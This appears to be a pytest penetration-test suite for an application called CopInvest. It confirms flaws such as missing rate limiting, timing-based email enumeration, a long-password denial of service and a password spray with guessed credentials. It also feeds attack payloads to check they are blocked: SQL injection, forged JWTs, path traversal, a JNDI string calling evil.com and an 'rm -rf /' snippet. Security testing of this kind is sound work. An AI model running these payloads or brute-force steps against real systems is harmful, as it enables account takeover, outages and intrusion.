"""
Black-box penetration test suite for CopInvest.

Runs from an attacker machine with only network access to the target.
No source code, .env, or filesystem access required.

Dependencies (attacker machine only): httpx, pytest, pytest-asyncio
"""

import asyncio
import time

import httpx
import pytest

BASE_URL = "http://localhost:8000"


# ─── ATK-01 — Full API map exposed without authentication ────────────────────


@pytest.mark.asyncio
async def test_atk01_openapi_exposed():
    """OpenAPI schema accessible without auth — exposes full API surface."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.get("/openapi.json")
    assert r.status_code == 200
    schema = r.json()
    paths = list(schema.get("paths", {}).keys())
    assert "/api/v1/auth/token" in paths
    assert "/api/v1/ingest" in paths
    assert "/health" in paths


# ─── ATK-03 — Unlimited brute force on login endpoint ────────────────────────


@pytest.mark.asyncio
async def test_atk03_no_rate_limiting():
    """20 rapid login attempts — no rate limiting applied."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        results = []
        for _ in range(20):
            r = await c.post(
                "/api/v1/auth/token",
                data={"username": "brute@test.hk", "password": "wrong"},
            )
            results.append(r.status_code)
    # All should return 401, none should be 429 (rate limited)
    assert all(code == 401 for code in results), f"Expected all 401, got {set(results)}"
    assert 429 not in results, "Rate limiting detected — ATK-03 mitigated"


# ─── ATK-04 — Email enumeration via timing side-channel ──────────────────────


@pytest.mark.asyncio
async def test_atk04_timing_side_channel():
    """Valid vs invalid email shows measurable timing difference (bcrypt)."""
    # NOTE: Requires a known valid email in the target DB.
    # Using carol@copinvest.hk as per report; adjust if needed.
    valid_email = "carol@copinvest.hk"
    invalid_email = "nonexistent@nowhere.invalid"
    samples = 10

    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        valid_times = []
        invalid_times = []
        for _ in range(samples):
            t0 = time.perf_counter()
            await c.post(
                "/api/v1/auth/token",
                data={"username": valid_email, "password": "x"},
            )
            valid_times.append(time.perf_counter() - t0)

            t0 = time.perf_counter()
            await c.post(
                "/api/v1/auth/token",
                data={"username": invalid_email, "password": "x"},
            )
            invalid_times.append(time.perf_counter() - t0)

    median_valid = sorted(valid_times)[samples // 2]
    median_invalid = sorted(invalid_times)[samples // 2]
    ratio = median_valid / median_invalid if median_invalid > 0 else float("inf")
    # Report showed 58.6x ratio; anything > 3x is exploitable
    assert ratio > 3, f"Timing ratio {ratio:.1f}x — side-channel not significant"


# ─── ATK-13 — Server technology disclosed in response headers ─────────────────


@pytest.mark.asyncio
async def test_atk13_server_header_disclosure():
    """Response headers reveal server software (uvicorn)."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.get("/health")
    server = r.headers.get("server", "")
    assert "uvicorn" in server.lower(), f"Server header: '{server}'"


# ─── ATK-17 — No concurrent request limiting ─────────────────────────────────


@pytest.mark.asyncio
async def test_atk17_no_concurrent_limiting():
    """50 parallel requests — no 429 or 503 returned."""

    async def fire(c: httpx.AsyncClient):
        return await c.post(
            "/api/v1/auth/token",
            data={"username": "flood@test.hk", "password": "x"},
        )

    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        tasks = [fire(c) for _ in range(50)]
        responses = await asyncio.gather(*tasks)

    codes = [r.status_code for r in responses]
    assert 429 not in codes, "Rate limiting detected"
    assert 503 not in codes, "Service unavailable returned"
    assert all(code == 401 for code in codes)


# ─── ATK-19b — 100k password crashes target (unauthenticated DoS) ────────────


@pytest.mark.asyncio
async def test_atk19b_long_password_dos():
    """100,000 char password causes HTTP 500 — unauthenticated DoS."""
    payload = "A" * 100_000
    async with httpx.AsyncClient(base_url=BASE_URL, timeout=30) as c:
        r = await c.post(
            "/api/v1/auth/token",
            data={"username": "dos@test.hk", "password": payload},
        )
    # Server should NOT crash — if it returns 500, the vuln exists
    assert r.status_code == 500, (
        f"Expected 500 (DoS confirmed), got {r.status_code} — may be fixed"
    )


# ─── ATK-20 — Password spray ─────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_atk20_password_spray():
    """Passwords derived from role names exposed in OpenAPI schema."""
    # Guesses based on roles found in ATK-01: adviser, senior_adviser, compliance
    spray = [
        ("carol@copinvest.hk", "compliance123"),
        ("alice@copinvest.hk", "adviser123"),
    ]
    cracked = []
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        for email, password in spray:
            r = await c.post(
                "/api/v1/auth/token",
                data={"username": email, "password": password},
            )
            if r.status_code == 200:
                cracked.append(email)
    assert len(cracked) > 0, "No accounts cracked — passwords may have been rotated"


# ─── ATK-28 — No token revocation ────────────────────────────────────────────


@pytest.mark.asyncio
async def test_atk28_no_token_revocation():
    """Multiple tokens for same user all remain valid simultaneously."""
    creds = {"username": "carol@copinvest.hk", "password": "compliance123"}
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r1 = await c.post("/api/v1/auth/token", data=creds)
        r2 = await c.post("/api/v1/auth/token", data=creds)
        if r1.status_code != 200 or r2.status_code != 200:
            pytest.skip("Cannot login — credentials may have changed")
        token1 = r1.json()["access_token"]
        token2 = r2.json()["access_token"]
        assert token1 != token2, "Same token returned — no new session created"
        # Both tokens should work
        me1 = await c.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {token1}"})
        me2 = await c.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {token2}"})
    assert me1.status_code == 200, "Old token rejected — revocation may exist"
    assert me2.status_code == 200, "New token rejected"


# ─── Blocked attacks — SQL injection ─────────────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_sql_injection():
    """SQL injection payloads in login — all rejected by ORM."""
    sqli_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users;--",
        "' OR ''='",
        "1' OR '1'='1'/*",
        "' OR 1=1#",
        "') OR ('1'='1",
        "' OR 'x'='x",
        "admin' OR '1'='1",
    ]
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        for payload in sqli_payloads:
            r = await c.post(
                "/api/v1/auth/token",
                data={"username": payload, "password": payload},
            )
            assert r.status_code == 401, f"SQLi payload got {r.status_code}: {payload}"


# ─── Blocked attacks — JWT forgery ───────────────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_jwt_weak_secrets():
    """Forged JWTs with common weak secrets — all rejected."""
    import jwt as pyjwt

    weak_secrets = ["secret", "password", "123456", "changeme", "key", ""]
    for secret in weak_secrets:
        token = pyjwt.encode(
            {"sub": "user-001", "role": "compliance"},
            secret,
            algorithm="HS256",
        )
        async with httpx.AsyncClient(base_url=BASE_URL) as c:
            r = await c.get(
                "/api/v1/auth/me",
                headers={"Authorization": f"Bearer {token}"},
            )
        assert r.status_code in (401, 403), f"Weak secret '{secret}' accepted!"


@pytest.mark.asyncio
async def test_blocked_jwt_alg_none():
    """JWT alg=none bypass variants — all rejected."""
    import jwt as pyjwt

    for alg in ["none", "None", "NONE", "nOnE"]:
        token = pyjwt.encode(
            {"sub": "user-001", "role": "compliance"},
            "",
            algorithm="HS256",
        )
        # Manually craft alg=none token
        import base64, json

        header = base64.urlsafe_b64encode(
            json.dumps({"alg": alg, "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "user-001", "role": "compliance"}).encode()
        ).rstrip(b"=").decode()
        forged = f"{header}.{payload}."

        async with httpx.AsyncClient(base_url=BASE_URL) as c:
            r = await c.get(
                "/api/v1/auth/me",
                headers={"Authorization": f"Bearer {forged}"},
            )
        assert r.status_code in (401, 403), f"alg={alg} bypass worked!"


@pytest.mark.asyncio
async def test_blocked_expired_token_replay():
    """Expired token is rejected."""
    import jwt as pyjwt
    from datetime import datetime, timedelta, timezone

    token = pyjwt.encode(
        {
            "sub": "user-001",
            "role": "compliance",
            "exp": datetime.now(timezone.utc) - timedelta(hours=1),
        },
        "fake-secret",
        algorithm="HS256",
    )
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.get(
            "/api/v1/auth/me",
            headers={"Authorization": f"Bearer {token}"},
        )
    assert r.status_code in (401, 403)


# ─── Blocked attacks — Malformed JWT ─────────────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_malformed_jwt():
    """Malformed JWT variants — all rejected."""
    malformed = [
        "not.a.token",
        "eyJhbGciOiJIUzI1NiJ9..invalid",
        "a.b.c.d.e",
        "",
        "Bearer",
    ]
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        for token in malformed:
            r = await c.get(
                "/api/v1/auth/me",
                headers={"Authorization": f"Bearer {token}"},
            )
            assert r.status_code in (401, 403), f"Malformed JWT accepted: {token}"


# ─── Blocked attacks — Path traversal in filename ────────────────────────────


@pytest.mark.asyncio
async def test_blocked_path_traversal():
    """Path traversal in upload filename — rejected."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.post(
            "/api/v1/ingest",
            files={"file": ("../../etc/passwd", b"%PDF-1.4 fake", "application/pdf")},
            data={"sensitivity_tier": "1"},
        )
    # Should be rejected (401 without auth, or 422/400 with validation)
    assert r.status_code in (401, 403, 400, 422)


# ─── Blocked attacks — MIME type spoofing ────────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_mime_spoofing():
    """Non-PDF content with PDF MIME type — rejected."""
    spoofs = [
        ("evil.pdf", b"<script>alert(1)</script>", "application/pdf"),
        ("evil.pdf", b"#!/bin/bash\nrm -rf /", "application/pdf"),
        ("evil.pdf", b"\x89PNG\r\n\x1a\n", "application/pdf"),
    ]
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        for name, content, mime in spoofs:
            r = await c.post(
                "/api/v1/ingest",
                files={"file": (name, content, mime)},
                data={"sensitivity_tier": "1"},
            )
            assert r.status_code in (401, 403, 400, 422)


# ─── Blocked attacks — document_id injection ─────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_document_id_injection():
    """Malicious document_id values — all return 422."""
    injections = [
        "'; DROP TABLE documents;--",
        "../../../etc/passwd",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
        "<script>alert(1)</script>",
        "null",
        "undefined",
        "true",
        "-1",
        "0",
        "' OR '1'='1",
        "AAAA" * 1000,
        "\x00evil",
    ]
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        for doc_id in injections:
            r = await c.post(
                "/api/v1/ingest",
                files={"file": ("test.pdf", b"%PDF-1.4 fake", "application/pdf")},
                data={"sensitivity_tier": "1", "document_id": doc_id},
            )
            assert r.status_code in (401, 403, 422, 400), (
                f"document_id injection accepted: {doc_id[:50]}"
            )


# ─── Blocked attacks — Sensitivity tier abuse ────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_sensitivity_tier_float():
    """Float sensitivity tier — rejected by enum validation."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.post(
            "/api/v1/ingest",
            files={"file": ("test.pdf", b"%PDF-1.4 fake", "application/pdf")},
            data={"sensitivity_tier": "1.5"},
        )
    assert r.status_code in (401, 403, 422)


@pytest.mark.asyncio
async def test_blocked_sensitivity_tier_out_of_range():
    """Sensitivity tier out of range — rejected."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.post(
            "/api/v1/ingest",
            files={"file": ("test.pdf", b"%PDF-1.4 fake", "application/pdf")},
            data={"sensitivity_tier": "99"},
        )
    assert r.status_code in (401, 403, 422)


# ─── Blocked attacks — HTTP verb tampering ───────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_verb_tampering():
    """Wrong HTTP methods on endpoints — rejected."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.get("/api/v1/auth/token")
        assert r.status_code == 405
        r = await c.delete("/api/v1/ingest")
        assert r.status_code in (405, 401, 403)


# ─── Blocked attacks — Empty file upload ─────────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_empty_file():
    """Empty file upload — rejected."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.post(
            "/api/v1/ingest",
            files={"file": ("empty.pdf", b"", "application/pdf")},
            data={"sensitivity_tier": "1"},
        )
    assert r.status_code in (401, 403, 400, 422)


# ─── Blocked attacks — Long username ─────────────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_long_username():
    """10k char username — DB query returns None cleanly."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.post(
            "/api/v1/auth/token",
            data={"username": "A" * 10_000, "password": "x"},
        )
    assert r.status_code == 401


# ─── Blocked attacks — Host header injection ─────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_host_header_injection():
    """Injected Host header — not reflected in response."""
    injections = ["evil.com", "localhost:8000@evil.com", "evil.com\r\nX-Injected: true"]
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        for host in injections:
            r = await c.get("/health", headers={"Host": host})
            assert "evil" not in r.text, f"Host injection reflected: {host}"


# ─── Blocked attacks — Null byte in filename ─────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_null_byte_filename():
    """Null byte in filename — rejected."""
    async with httpx.AsyncClient(base_url=BASE_URL) as c:
        r = await c.post(
            "/api/v1/ingest",
            files={"file": ("test\x00.pdf", b"%PDF-1.4 fake", "application/pdf")},
            data={"sensitivity_tier": "1"},
        )
    assert r.status_code in (401, 403, 400, 422)
